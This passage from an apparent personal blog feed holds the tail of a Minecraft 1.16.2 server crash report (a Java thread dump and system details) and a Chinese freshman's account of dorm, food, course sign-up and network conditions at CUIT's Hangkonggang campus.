RUNNABLE (in native)<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll0(Native Method)<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll(Unknown Source)<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.access$400(Unknown Source)<br>at sun.nio.ch.WindowsSelectorImpl.doSelect(Unknown Source)<br>at sun.nio.ch.SelectorImpl.lockAndDoSelect(Unknown Source)<br>- locked io.netty.channel.nio.SelectedSelectionKeySet@46a3eee6<br>- locked java.util.Collections$UnmodifiableSet@3562e1f7<br>- locked sun.nio.ch.WindowsSelectorImpl@75c3782f<br>at sun.nio.ch.SelectorImpl.select(Unknown Source)<br>at io.netty.channel.nio.SelectedSelectionKeySetSelector.select(SelectedSelectionKeySetSelector.java:62)<br>at io.netty.channel.nio.NioEventLoop.select(NioEventLoop.java:756)<br>…</p><p>“Netty Server IO #20” Id=291 RUNNABLE (in native)<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll0(Native Method)<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll(Unknown Source)<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.access$400(Unknown Source)<br>at sun.nio.ch.WindowsSelectorImpl.doSelect(Unknown Source)<br>at sun.nio.ch.SelectorImpl.lockAndDoSelect(Unknown Source)<br>- locked io.netty.channel.nio.SelectedSelectionKeySet@5dfe3e55<br>- locked java.util.Collections$UnmodifiableSet@4f33fd2<br>- locked sun.nio.ch.WindowsSelectorImpl@263c1be2<br>at sun.nio.ch.SelectorImpl.select(Unknown Source)<br>at io.netty.channel.nio.SelectedSelectionKeySetSelector.select(SelectedSelectionKeySetSelector.java:62)<br>at io.netty.channel.nio.NioEventLoop.select(NioEventLoop.java:756)<br>…</p><p>“Netty Server IO #19” Id=290 RUNNABLE (in native)<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll0(Native Method)<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll(Unknown Source)<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.access$400(Unknown Source)<br>at sun.nio.ch.WindowsSelectorImpl.doSelect(Unknown Source)<br>at sun.nio.ch.SelectorImpl.lockAndDoSelect(Unknown Source)<br>- locked io.netty.channel.nio.SelectedSelectionKeySet@48d01d0a<br>- locked java.util.Collections$UnmodifiableSet@64709ed3<br>- locked sun.nio.ch.WindowsSelectorImpl@79603020<br>at sun.nio.ch.SelectorImpl.select(Unknown Source)<br>at io.netty.channel.nio.SelectedSelectionKeySetSelector.select(SelectedSelectionKeySetSelector.java:62)<br>at io.netty.channel.nio.NioEventLoop.select(NioEventLoop.java:756)<br>…</p><p>“Netty Server IO #18” Id=289 RUNNABLE (in native)<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll0(Native Method)<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll(Unknown Source)<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.access$400(Unknown Source)<br>at sun.nio.ch.WindowsSelectorImpl.doSelect(Unknown Source)<br>at sun.nio.ch.SelectorImpl.lockAndDoSelect(Unknown Source)<br>- locked io.netty.channel.nio.SelectedSelectionKeySet@3f45d7e5<br>- locked java.util.Collections$UnmodifiableSet@7735b54a<br>- locked sun.nio.ch.WindowsSelectorImpl@17532b79<br>at sun.nio.ch.SelectorImpl.select(Unknown Source)<br>at io.netty.channel.nio.SelectedSelectionKeySetSelector.select(SelectedSelectionKeySetSelector.java:62)<br>at io.netty.channel.nio.NioEventLoop.select(NioEventLoop.java:756)<br>…</p><p>“Netty Server IO #17” Id=288 RUNNABLE (in native)<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll0(Native Method)<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll(Unknown Source)<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.access$400(Unknown Source)<br>at sun.nio.ch.WindowsSelectorImpl.doSelect(Unknown Source)<br>at sun.nio.ch.SelectorImpl.lockAndDoSelect(Unknown Source)<br>- locked io.netty.channel.nio.SelectedSelectionKeySet@6fcaf883<br>- locked java.util.Collections$UnmodifiableSet@7ea1f060<br>- locked sun.nio.ch.WindowsSelectorImpl@2464951b<br>at sun.nio.ch.SelectorImpl.select(Unknown Source)<br>at io.netty.channel.nio.SelectedSelectionKeySetSelector.select(SelectedSelectionKeySetSelector.java:62)<br>at io.netty.channel.nio.NioEventLoop.select(NioEventLoop.java:756)<br>…</p><p>“Netty Server IO #16” Id=287 RUNNABLE (in native)<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll0(Native Method)<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll(Unknown Source)<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.access$400(Unknown Source)<br>at sun.nio.ch.WindowsSelectorImpl.doSelect(Unknown Source)<br>at sun.nio.ch.SelectorImpl.lockAndDoSelect(Unknown Source)<br>- locked io.netty.channel.nio.SelectedSelectionKeySet@2ae26a0d<br>- locked java.util.Collections$UnmodifiableSet@12d48132<br>- locked sun.nio.ch.WindowsSelectorImpl@630751f8<br>at sun.nio.ch.SelectorImpl.select(Unknown Source)<br>at io.netty.channel.nio.SelectedSelectionKeySetSelector.select(SelectedSelectionKeySetSelector.java:62)<br>at io.netty.channel.nio.NioEventLoop.select(NioEventLoop.java:756)<br>…</p><p>“Netty Server IO #15” Id=286 RUNNABLE (in native)<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll0(Native Method)<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll(Unknown Source)<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.access$400(Unknown Source)<br>at sun.nio.ch.WindowsSelectorImpl.doSelect(Unknown Source)<br>at sun.nio.ch.SelectorImpl.lockAndDoSelect(Unknown Source)<br>- locked io.netty.channel.nio.SelectedSelectionKeySet@634bccce<br>- locked java.util.Collections$UnmodifiableSet@5ac070a8<br>- locked sun.nio.ch.WindowsSelectorImpl@6cabb7d3<br>at sun.nio.ch.SelectorImpl.select(Unknown Source)<br>at io.netty.channel.nio.SelectedSelectionKeySetSelector.select(SelectedSelectionKeySetSelector.java:62)<br>at io.netty.channel.nio.NioEventLoop.select(NioEventLoop.java:756)<br>…</p><p>“Netty Server IO #14” Id=236 RUNNABLE<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll0(Native Method)<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll(Unknown Source)<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.access$400(Unknown Source)<br>at sun.nio.ch.WindowsSelectorImpl.doSelect(Unknown Source)<br>at sun.nio.ch.SelectorImpl.lockAndDoSelect(Unknown Source)<br>- locked io.netty.channel.nio.SelectedSelectionKeySet@35fab32f<br>- locked java.util.Collections$UnmodifiableSet@8ea24e2<br>- locked sun.nio.ch.WindowsSelectorImpl@51f65067<br>at sun.nio.ch.SelectorImpl.select(Unknown Source)<br>at io.netty.channel.nio.SelectedSelectionKeySetSelector.select(SelectedSelectionKeySetSelector.java:62)<br>at io.netty.channel.nio.NioEventLoop.select(NioEventLoop.java:756)<br>…</p><p>“Netty Server IO #13” Id=219 RUNNABLE<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll0(Native Method)<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll(Unknown Source)<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.access$400(Unknown Source)<br>at sun.nio.ch.WindowsSelectorImpl.doSelect(Unknown Source)<br>at sun.nio.ch.SelectorImpl.lockAndDoSelect(Unknown Source)<br>- locked io.netty.channel.nio.SelectedSelectionKeySet@605260a5<br>- locked java.util.Collections$UnmodifiableSet@d1d44b<br>- locked sun.nio.ch.WindowsSelectorImpl@59452d87<br>at sun.nio.ch.SelectorImpl.select(Unknown Source)<br>at io.netty.channel.nio.SelectedSelectionKeySetSelector.select(SelectedSelectionKeySetSelector.java:62)<br>at io.netty.channel.nio.NioEventLoop.select(NioEventLoop.java:756)<br>…</p><p>“Netty Server IO #12” Id=209 RUNNABLE (in native)<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll0(Native Method)<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll(Unknown Source)<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.access$400(Unknown Source)<br>at sun.nio.ch.WindowsSelectorImpl.doSelect(Unknown Source)<br>at sun.nio.ch.SelectorImpl.lockAndDoSelect(Unknown Source)<br>- locked io.netty.channel.nio.SelectedSelectionKeySet@3ad33ba0<br>- locked java.util.Collections$UnmodifiableSet@49f73317<br>- locked sun.nio.ch.WindowsSelectorImpl@470ad5ee<br>at sun.nio.ch.SelectorImpl.select(Unknown Source)<br>at io.netty.channel.nio.SelectedSelectionKeySetSelector.select(SelectedSelectionKeySetSelector.java:62)<br>at io.netty.channel.nio.NioEventLoop.select(NioEventLoop.java:756)<br>…</p><p>“Netty Server IO #11” Id=208 RUNNABLE (in native)<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll0(Native Method)<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll(Unknown Source)<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.access$400(Unknown Source)<br>at sun.nio.ch.WindowsSelectorImpl.doSelect(Unknown Source)<br>at sun.nio.ch.SelectorImpl.lockAndDoSelect(Unknown Source)<br>- locked io.netty.channel.nio.SelectedSelectionKeySet@3753e19d<br>- locked java.util.Collections$UnmodifiableSet@147ed2ec<br>- locked sun.nio.ch.WindowsSelectorImpl@646134ff<br>at sun.nio.ch.SelectorImpl.select(Unknown Source)<br>at io.netty.channel.nio.SelectedSelectionKeySetSelector.select(SelectedSelectionKeySetSelector.java:62)<br>at io.netty.channel.nio.NioEventLoop.select(NioEventLoop.java:756)<br>…</p><p>“Netty Server IO #10” Id=198 RUNNABLE (in native)<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll0(Native Method)<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll(Unknown Source)<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.access$400(Unknown Source)<br>at sun.nio.ch.WindowsSelectorImpl.doSelect(Unknown Source)<br>at sun.nio.ch.SelectorImpl.lockAndDoSelect(Unknown Source)<br>- locked io.netty.channel.nio.SelectedSelectionKeySet@75d53838<br>- locked java.util.Collections$UnmodifiableSet@5d226016<br>- locked sun.nio.ch.WindowsSelectorImpl@3f2920ec<br>at sun.nio.ch.SelectorImpl.select(Unknown Source)<br>at io.netty.channel.nio.SelectedSelectionKeySetSelector.select(SelectedSelectionKeySetSelector.java:62)<br>at io.netty.channel.nio.NioEventLoop.select(NioEventLoop.java:756)<br>…</p><p>“Netty Server IO #9” Id=166 RUNNABLE (in native)<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll0(Native Method)<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll(Unknown Source)<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.access$400(Unknown Source)<br>at sun.nio.ch.WindowsSelectorImpl.doSelect(Unknown Source)<br>at sun.nio.ch.SelectorImpl.lockAndDoSelect(Unknown Source)<br>- locked io.netty.channel.nio.SelectedSelectionKeySet@52822d3a<br>- locked java.util.Collections$UnmodifiableSet@e4acbaa<br>- locked sun.nio.ch.WindowsSelectorImpl@40a628a5<br>at sun.nio.ch.SelectorImpl.select(Unknown Source)<br>at io.netty.channel.nio.SelectedSelectionKeySetSelector.select(SelectedSelectionKeySetSelector.java:62)<br>at io.netty.channel.nio.NioEventLoop.select(NioEventLoop.java:756)<br>…</p><p>“Netty Server IO #8” Id=165 RUNNABLE (in native)<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll0(Native Method)<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll(Unknown Source)<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.access$400(Unknown Source)<br>at sun.nio.ch.WindowsSelectorImpl.doSelect(Unknown Source)<br>at sun.nio.ch.SelectorImpl.lockAndDoSelect(Unknown Source)<br>- locked io.netty.channel.nio.SelectedSelectionKeySet@36fe4e1d<br>- locked java.util.Collections$UnmodifiableSet@75565e05<br>- locked sun.nio.ch.WindowsSelectorImpl@2d99dc9e<br>at sun.nio.ch.SelectorImpl.select(Unknown Source)<br>at io.netty.channel.nio.SelectedSelectionKeySetSelector.select(SelectedSelectionKeySetSelector.java:62)<br>at io.netty.channel.nio.NioEventLoop.select(NioEventLoop.java:756)<br>…</p><p>“Netty Server IO #7” Id=124 RUNNABLE<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll0(Native Method)<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll(Unknown Source)<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.access$400(Unknown Source)<br>at sun.nio.ch.WindowsSelectorImpl.doSelect(Unknown Source)<br>at sun.nio.ch.SelectorImpl.lockAndDoSelect(Unknown Source)<br>- locked io.netty.channel.nio.SelectedSelectionKeySet@5c0b2a88<br>- locked java.util.Collections$UnmodifiableSet@184119b2<br>- locked sun.nio.ch.WindowsSelectorImpl@5f20cac9<br>at sun.nio.ch.SelectorImpl.select(Unknown Source)<br>at io.netty.channel.nio.SelectedSelectionKeySetSelector.select(SelectedSelectionKeySetSelector.java:62)<br>at io.netty.channel.nio.NioEventLoop.select(NioEventLoop.java:756)<br>…</p><p>“Netty Server IO #6” Id=72 RUNNABLE (in native)<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll0(Native Method)<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll(Unknown Source)<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.access$400(Unknown Source)<br>at sun.nio.ch.WindowsSelectorImpl.doSelect(Unknown Source)<br>at sun.nio.ch.SelectorImpl.lockAndDoSelect(Unknown Source)<br>- locked io.netty.channel.nio.SelectedSelectionKeySet@3c3e809f<br>- locked java.util.Collections$UnmodifiableSet@39e4a2fa<br>- locked sun.nio.ch.WindowsSelectorImpl@2978a0fd<br>at sun.nio.ch.SelectorImpl.select(Unknown Source)<br>at io.netty.channel.nio.SelectedSelectionKeySetSelector.select(SelectedSelectionKeySetSelector.java:62)<br>at io.netty.channel.nio.NioEventLoop.select(NioEventLoop.java:756)<br>…</p><p>“Netty Server IO #5” Id=70 RUNNABLE (in native)<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll0(Native Method)<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll(Unknown Source)<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.access$400(Unknown Source)<br>at sun.nio.ch.WindowsSelectorImpl.doSelect(Unknown Source)<br>at sun.nio.ch.SelectorImpl.lockAndDoSelect(Unknown Source)<br>- locked io.netty.channel.nio.SelectedSelectionKeySet@70d75199<br>- locked java.util.Collections$UnmodifiableSet@38a50d64<br>- locked sun.nio.ch.WindowsSelectorImpl@244a9bf8<br>at sun.nio.ch.SelectorImpl.select(Unknown Source)<br>at io.netty.channel.nio.SelectedSelectionKeySetSelector.select(SelectedSelectionKeySetSelector.java:62)<br>at io.netty.channel.nio.NioEventLoop.select(NioEventLoop.java:756)<br>…</p><p>“Netty Server IO #4” Id=69 RUNNABLE (in native)<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll0(Native Method)<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll(Unknown Source)<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.access$400(Unknown Source)<br>at sun.nio.ch.WindowsSelectorImpl.doSelect(Unknown Source)<br>at sun.nio.ch.SelectorImpl.lockAndDoSelect(Unknown Source)<br>- locked io.netty.channel.nio.SelectedSelectionKeySet@48d9b8c4<br>- locked java.util.Collections$UnmodifiableSet@2c873df<br>- locked sun.nio.ch.WindowsSelectorImpl@129690cf<br>at sun.nio.ch.SelectorImpl.select(Unknown Source)<br>at io.netty.channel.nio.SelectedSelectionKeySetSelector.select(SelectedSelectionKeySetSelector.java:62)<br>at io.netty.channel.nio.NioEventLoop.select(NioEventLoop.java:756)<br>…</p><p>“Netty Server IO #3” Id=61 RUNNABLE (in native)<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll0(Native Method)<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll(Unknown Source)<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.access$400(Unknown Source)<br>at sun.nio.ch.WindowsSelectorImpl.doSelect(Unknown Source)<br>at sun.nio.ch.SelectorImpl.lockAndDoSelect(Unknown Source)<br>- locked io.netty.channel.nio.SelectedSelectionKeySet@62f34c3e<br>- locked java.util.Collections$UnmodifiableSet@6769c73c<br>- locked sun.nio.ch.WindowsSelectorImpl@267e0685<br>at sun.nio.ch.SelectorImpl.select(Unknown Source)<br>at io.netty.channel.nio.SelectedSelectionKeySetSelector.select(SelectedSelectionKeySetSelector.java:62)<br>at io.netty.channel.nio.NioEventLoop.select(NioEventLoop.java:756)<br>…</p><p>“Netty Server IO #2” Id=54 RUNNABLE (in native)<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll0(Native Method)<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll(Unknown Source)<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.access$400(Unknown Source)<br>at sun.nio.ch.WindowsSelectorImpl.doSelect(Unknown Source)<br>at sun.nio.ch.SelectorImpl.lockAndDoSelect(Unknown Source)<br>- locked io.netty.channel.nio.SelectedSelectionKeySet@48ea6d<br>- locked java.util.Collections$UnmodifiableSet@7822d4e6<br>- locked sun.nio.ch.WindowsSelectorImpl@51dbacf9<br>at sun.nio.ch.SelectorImpl.select(Unknown Source)<br>at io.netty.channel.nio.SelectedSelectionKeySetSelector.select(SelectedSelectionKeySetSelector.java:62)<br>at io.netty.channel.nio.NioEventLoop.select(NioEventLoop.java:756)<br>…</p><p>“Netty Server IO #1” Id=53 RUNNABLE (in native)<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll0(Native Method)<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll(Unknown Source)<br>at sun.nio.ch.WindowsSelectorImpl$SubSelector.access$400(Unknown Source)<br>at sun.nio.ch.WindowsSelectorImpl.doSelect(Unknown Source)<br>at sun.nio.ch.SelectorImpl.lockAndDoSelect(Unknown Source)<br>- locked io.netty.channel.nio.SelectedSelectionKeySet@7c7d269<br>- locked java.util.Collections$UnmodifiableSet@401b5b7e<br>- locked sun.nio.ch.WindowsSelectorImpl@2ef0327f<br>at sun.nio.ch.SelectorImpl.select(Unknown Source)<br>at io.netty.channel.nio.SelectedSelectionKeySetSelector.select(SelectedSelectionKeySetSelector.java:62)<br>at io.netty.channel.nio.NioEventLoop.select(NioEventLoop.java:756)<br>…</p><p>“Java2D Disposer” Id=51 WAITING on java.lang.ref.ReferenceQueue$Lock@2240ef3c<br>at java.lang.Object.wait(Native Method)<br>- waiting on java.lang.ref.ReferenceQueue$Lock@2240ef3c<br>at java.lang.ref.ReferenceQueue.remove(Unknown Source)<br>at java.lang.ref.ReferenceQueue.remove(Unknown Source)<br>at sun.java2d.Disposer.run(Unknown Source)<br>at java.lang.Thread.run(Unknown Source)</p><p>“Server Watchdog” Id=50 RUNNABLE<br>at sun.management.ThreadImpl.dumpThreads0(Native Method)<br>at sun.management.ThreadImpl.dumpAllThreads(Unknown Source)<br>at zj.run(SourceFile:45)<br>at java.lang.Thread.run(Unknown Source)</p><p>“Query Listener #1” Id=49 RUNNABLE<br>at java.net.DualStackPlainDatagramSocketImpl.socketReceiveOrPeekData(Native Method)<br>at java.net.DualStackPlainDatagramSocketImpl.receive0(Unknown Source)<br>at java.net.AbstractPlainDatagramSocketImpl.receive(Unknown Source)<br>- locked java.net.DualStackPlainDatagramSocketImpl@1bad2587<br>at java.net.DatagramSocket.receive(Unknown Source)<br>- locked java.net.DatagramPacket@1f75d27<br>- locked java.net.DatagramSocket@2e3bf4ac<br>at adh.run(SourceFile:258)<br>at java.lang.Thread.run(Unknown Source)</p><p>“Netty Server IO #0” Id=46 BLOCKED on java.util.Collections$SynchronizedRandomAccessList@206966ed owned by “Server thread” Id=40<br>at java.util.Collections$SynchronizedCollection.add(Unknown Source)<br>- blocked on java.util.Collections$SynchronizedRandomAccessList@206966ed<br>at aax$1.initChannel(SourceFile:108)<br>at io.netty.channel.ChannelInitializer.initChannel(ChannelInitializer.java:113)<br>at io.netty.channel.ChannelInitializer.handlerAdded(ChannelInitializer.java:105)<br>at io.netty.channel.DefaultChannelPipeline.callHandlerAdded0(DefaultChannelPipeline.java:637)<br>at io.netty.channel.DefaultChannelPipeline.access$000(DefaultChannelPipeline.java:46)<br>at io.netty.channel.DefaultChannelPipeline$PendingHandlerAddedTask.execute(DefaultChannelPipeline.java:1487)<br>at io.netty.channel.DefaultChannelPipeline.callHandlerAddedForAllHandlers(DefaultChannelPipeline.java:1161)<br>…</p><p>“ObjectCleanerThread” Id=45 TIMED_WAITING on java.lang.ref.ReferenceQueue$Lock@b27d758<br>at java.lang.Object.wait(Native Method)<br>- waiting on java.lang.ref.ReferenceQueue$Lock@b27d758<br>at java.lang.ref.ReferenceQueue.remove(Unknown Source)<br>at io.netty.util.internal.ObjectCleaner$1.run(ObjectCleaner.java:54)<br>at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30)<br>at java.lang.Thread.run(Unknown Source)</p><p>“DestroyJavaVM” Id=44 RUNNABLE</p><p>“Server console handler” Id=43 RUNNABLE (in native)<br>at java.io.FileInputStream.readBytes(Native Method)<br>at java.io.FileInputStream.read(Unknown Source)<br>at java.io.BufferedInputStream.read1(Unknown Source)<br>at java.io.BufferedInputStream.read(Unknown Source)<br>- locked java.io.BufferedInputStream@79545aa6<br>at sun.nio.cs.StreamDecoder.readBytes(Unknown Source)<br>at sun.nio.cs.StreamDecoder.implRead(Unknown Source)<br>at sun.nio.cs.StreamDecoder.read(Unknown Source)<br>- locked java.io.InputStreamReader@42f12ece<br>at java.io.InputStreamReader.read(Unknown Source)<br>…</p><p>“Server thread” Id=40 RUNNABLE<br>at java.util.stream.IntPipeline$4$1.accept(Unknown Source)<br>at java.util.stream.Streams$RangeIntSpliterator.forEachRemaining(Unknown Source)<br>at java.util.Spliterator$OfInt.forEachRemaining(Unknown Source)<br>at java.util.stream.AbstractPipeline.copyInto(Unknown Source)<br>at java.util.stream.AbstractPipeline.wrapAndCopyInto(Unknown Source)<br>at java.util.stream.StreamSpliterators$WrappingSpliterator.forEachRemaining(Unknown Source)<br>at com.google.common.collect.CollectSpliterators$1WithCharacteristics.forEachRemaining(CollectSpliterators.java:65)<br>at java.util.stream.ReferencePipeline$Head.forEach(Unknown Source)<br>…</p><p>“Snooper Timer” Id=41 WAITING on java.util.TaskQueue@331e3ca8<br>at java.lang.Object.wait(Native Method)<br>- waiting on java.util.TaskQueue@331e3ca8<br>at java.lang.Object.wait(Unknown Source)<br>at java.util.TimerThread.mainLoop(Unknown Source)<br>at java.util.TimerThread.run(Unknown Source)</p><p>“Timer hack thread” Id=32 TIMED_WAITING<br>at java.lang.Thread.sleep(Native Method)<br>at x$6.run(SourceFile:636)</p><p>“Attach Listener” Id=5 RUNNABLE</p><p>“Signal Dispatcher” Id=4 RUNNABLE</p><p>“Finalizer” Id=3 WAITING on java.lang.ref.ReferenceQueue$Lock@636a084<br>at java.lang.Object.wait(Native Method)<br>- waiting on java.lang.ref.ReferenceQueue$Lock@636a084<br>at java.lang.ref.ReferenceQueue.remove(Unknown Source)<br>at java.lang.ref.ReferenceQueue.remove(Unknown Source)<br>at java.lang.ref.Finalizer$FinalizerThread.run(Unknown Source)</p><p>“Reference Handler” Id=2 WAITING on java.lang.ref.Reference$Lock@5d6c4b8e<br>at java.lang.Object.wait(Native Method)<br>- waiting on java.lang.ref.Reference$Lock@5d6c4b8e<br>at java.lang.Object.wait(Unknown Source)<br>at java.lang.ref.Reference.tryHandlePending(Unknown Source)<br>at java.lang.ref.Reference$ReferenceHandler.run(Unknown Source)</p><p>Stacktrace:<br>at zj.run(SourceFile:61)<br>at java.lang.Thread.run(Unknown Source)</p><p>-- System Details –<br>Details:<br>Minecraft Version: 1.16.2<br>Minecraft Version ID: 1.16.2<br>Operating System: Windows 10 (amd64) version 10.0<br>Java Version: 1.8.0_141, Oracle Corporation<br>Java VM Version: Java HotSpot(TM) 64-Bit Server VM (mixed mode), Oracle Corporation<br>Memory: 4599614408 bytes (4386 MB) / 6228017152 bytes (5939 MB) up to 19088801792 bytes (18204 MB)<br>CPUs: 32<br>JVM Flags: 2 total; -Xms4G -Xmx20G<br>Player Count: 2 / 20; [aah[‘Fever_King’/52754, l=’ServerLevel[world]‘, x=-116.44, y=121.00, z=-246.73], aah[‘Alpha___EX’/55209, l=’ServerLevel[world]‘, x=-491.94, y=188.00, z=193.01]]<br>Data Packs: vanilla<br>Is Modded: Unknown (can’t tell)<br>Type: Dedicated Server (map_server.txt)</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;崩溃日志如下&lt;/p&gt;
&lt;p&gt;-— Minecraft Crash Report —-&lt;br&gt;// You’re mean.&lt;/p&gt;
&lt;p&gt;Time: 11/1/20 5:56 PM&lt;br&gt;Description: Watching Server&lt;/p&gt;
&lt;p&gt;java.la</summary>
      
    
    
    
    <category term="Minecraft" scheme="https://zwh-china.github.io/categories/Minecraft/"/>
    
    
  </entry>
  
  <entry>
    <title>CUIT生活体验</title>
    <link href="https://zwh-china.github.io/2020/10/12/cuit%E7%94%9F%E6%B4%BB%E4%BD%93%E9%AA%8C/"/>
    <id>https://zwh-china.github.io/2020/10/12/cuit%E7%94%9F%E6%B4%BB%E4%BD%93%E9%AA%8C/</id>
    <published>2020-10-12T09:13:12.000Z</published>
    <updated>2021-04-20T21:15:38.443Z</updated>
    
    <content type="html"><![CDATA[<pre><code>写在前面，本内容纯属个人性质的感受和体验，仅代表我个人的观点和立场。作为20届新生开学一个月来的初步体验，为下一届航空港的新生提供有限的参考</code></pre><p>先说学校的住宿，对于航空港的情况来说，没有4人间，只有6人间存在，航空港校区仅有的4人间是提供给研究生的。对于我所在的专业信息安全，女生也无一例外都是6人。寝室空间虽较小，但尚可接受。可是寝室有诸多设计不人性化的地方，例如两侧桌子与床固定，无法挪动，导致书本等物品掉落在柜子后时非常难捡到，同时桌面没有开孔，所以对于台式机同学非常不方便，本人尝试与校方沟通无果，辅导员表示因为没有打孔先例所以不予打孔批准。所以说台式机基本没可能。同时桌面空间比较小屏幕不建议4k，4k能够勉强放下但是因为书柜设计问题显示屏幕会被顶的很靠前，导致手没地方放。寝室整体装修比较新，整体环境还算不错，作为学校比较靠内的宿舍楼来说，晚上基本听不到飞机的噪音，这点不用因为学校临近机场而担心。热水的话，晚上一般来说11点后也会有，电的话时理论上24小时不断电，功率似乎没什么明显限制，实测吹风机，高功耗台式机没有问题。</p><p>对于饮食方面，据我短期观察学校1、2食堂似乎基本都没有带叶子青菜（快餐类），青菜基本局限于包菜，土豆丝一类。同时基本菜里都有点辣椒，但是不算太辣，属于尚可接受的范围。想要吃青菜，只能指望吃面时面汤中放的亮片生菜，这点的确有些不人性化。对于学校这两个食堂，无论是新生还是老生，基本都是更偏向于一食堂，认为一食堂更干净一些，也更好吃。但是无论如何食堂菜的味道都差不多。是在吃不习惯可以点外卖，美团上那个千味居黄焖鸡还不错。学校奶茶店还是比较多的，有蜜雪冰城，所以说奶茶之类饮品价格不算太贵。学校教学楼一楼也设有自动贩卖机。</p><p>对于体育设施配套，应该总体来说还凑合，对于乒乓球台来说有室内和室外，篮球是那种室外的一个一个的那种区块形式的篮球场，足球设施配套不太清楚，不做评价。</p><p>对于刚开学需要注意的坑，我们学校对于新生英语4.6级考试的资格不是按照高考成绩内定（至少我们这届不是），而是靠抢，学校会提前开放名额给大二以上学生，所以留给新生的名额就不多了，务必要抢。同时选体育课是需要抢的，我们这届有排球，乒乓球，篮球，太极，瑜伽，健美操，跆拳道，足球。乒乓球、篮球和足球属于相对热门，想要选这几个的同学务必时刻关注教务处的动态。我们这届是晚上12点开放，等我一觉起来啥都没了。所以这两俩是很坑的。同时开学后第一件事估计就是体检，体检人非常多，我们这届学校没有组织，只是给定了期限让我们抽空去，结果抽血，胸片人超级多多到你难以想象，所以务必及时赶早去完成这两个项目的检测。学校进出需要人脸识别，需携带身份证去图书馆录入，方可进出学校。PS.开学考勤查的严，不要旷课，否则…</p><p>对于高中初中都没有住宿经历的同学，第一个晚上可能有些难度过，因为你的室友可能会打呼噜，因为第一天嘛，搬行李都很累，所以如果你睡觉不能容忍任何声音，建议早点睡，否则等你的室友开始打呼噜（开炮），你就会彻夜不眠，极其难受。本人就体会到了这种难受，甚至无法入睡水群时找到一个同患难的同班同学，建议这类同学提前买一个降噪耳机，苹果的AirPods Pro效果还不错，呼噜声基本没了，晚上也还能休息好。</p><p>大一是有早操和晚自习的，晚自习到晚上9点，大学晚自习和高中还是有很大区别，你带个电脑去，带个平板，玩个手机，听歌音乐，不会有人说什么。早操的话就比较早了，基本没有溜号的可能，没法睡懒觉喽。</p><p>刚开学肯定会有不少人拉你办卡，我建议就办张电信的卡，学校电信的网还是不错的，就是教学楼手机网速会很慢，大型集会，网速基本也就是能勉强聊个QQ的水平。网络这块算是中规中矩吧，用电信还有个好处就是，不需要买破解版路由器，其他提供商的网络只能直插电脑，你若想用无线路由器就会发现自己上不了网，只能被迫去买所谓破解版路由器，当然如果你自己有技术破解，那当我没说。</p><p>既来之则安之，无论你是为何选择了这所学校，一定要向目标前进，不要因为环境而阻挡了你前进的脚步。</p>]]></content>
    
    
      
      
